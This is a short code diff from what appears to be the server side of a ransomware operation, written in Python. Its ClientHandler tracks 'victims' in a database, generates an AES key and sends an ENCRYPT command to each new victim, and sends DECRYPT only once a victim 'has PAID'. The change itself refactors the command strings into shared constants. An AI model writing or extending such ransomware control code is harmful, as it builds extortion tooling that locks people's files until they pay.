@@ -7,6 +7,7 @@ from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 
+from consts.shared_consts import DECRYPT, ENCRYPT
 from protocol import send_msg
 
 class ClientHandler:
@@ -47,7 +48,7 @@ class ClientHandler:
             result = cursor.fetchone()
             db.close()
             if result:
-                return result[0], result[1] #(has_paid, encrypted_key)
+                return result[0], result[1] # (has_paid, encrypted_key)
             return None, None
         except sqlite3.Error as e:
             print(f" DB Read Error: {e}")
@@ -84,7 +85,7 @@ class ClientHandler:
 
         if encrypted_key_from_db is None:
             print(" New victim! Generating key and sending ENCRYPT command.")
-            action = b"ENCRYPT"
+            action = ENCRYPT
             aes_key = get_random_bytes(KEY_BYTES_SIZE)
             
             try:
@@ -96,7 +97,7 @@ class ClientHandler:
         else:
             if has_paid:
                 print(f"Victim {client_ip} has PAID! Decrypting key and sending DECRYPT command.")
-                action = b"DECRYPT"
+                action = DECRYPT
                 try:
                     aes_key = self._decrypt_aes_from_db(encrypted_key_from_db)
                 except FileNotFoundError:
